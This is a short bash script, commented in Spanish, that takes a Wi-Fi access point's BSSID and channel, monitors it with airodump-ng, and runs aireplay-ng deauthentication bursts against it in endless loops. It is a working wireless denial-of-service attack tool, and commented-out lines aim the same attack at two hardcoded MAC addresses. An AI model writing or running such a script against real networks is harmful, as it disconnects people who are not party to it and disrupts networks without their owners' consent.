#!/bin/bash

echo "	Ingrese bssid"

read var_bssid
echo " "
echo "El nombre del es $var_bssid"
echo " "
echo "	Analizar"

echo "airodump-ng wlan0mon --bssid $var_bssid"

x-terminal-emulator -e airodump-ng wlan0mon --bssid $var_bssid

echo " "
echo "	Leer canal"
read var_channel
echo "	Usando canal $var_channel"



while :
do
	echo "	Desautenticando"
echo "******************************************"
	#x-terminal-emulator -e airodump-ng wlan0mon -c $var_channel --bssid $var_bssid & sleep 3 & x-terminal-emulator -e aireplay-ng --deauth 30 -a E4:AB:89:3D:A6:81 wlan0mon & sleep 5
	#x-terminal-emulator -e cmatrix -C blue & sleep 10 & x-terminal-emulator -e cmatrix & sleep 20
	#x-terminal-emulator -e cmatrix -C blue & sleep 2
	x-terminal-emulator -e airodump-ng wlan0mon -c $var_channel --bssid $var_bssid &
while :
do
	aireplay-ng --deauth 3 -a $var_bssid wlan0mon

	if [ $? -ne 0 ]; then 
	break
	else 
	echo "Sí está en canal"; 
	fi
	
	#x-terminal-emulator -e cmatrix -C red & sleep 20
	#state=$(x-terminal-emulator -e aireplay-ng --deauth 30 -a $var_bssid wlan0mon & sleep 5)
	#state_var=$(x-terminal-emulator -e cmatrix -C red)
	#echo $state_var & sleep 3

	#x-terminal-emulator -e cmatrix -C red &

	#if [[$state_var -ne 0]]; then
	#if [[ 001 -eq 1 ]]; then
        #	x-terminal-emulator -e cmatrix;break
	#fi
#if [ $? -ne 0 ]; then echo "No está en red"; else echo "Sí está en red"; fi
#echo "bien"

done
	#pkill 
	echo "Fin?"
	sleep 3

echo "Fin?"
sleep 1
done


#while :
#do
	#aireplay-ng --deauth 40 -a 30:96:FB:FC:B2:B6 wlan0mon
	#echo "Conectado"
	#sleep 10
	#echo "Desconectado"
#done



#echo $!
#13521
#var=$(echo $!)
#echo $var
#13521



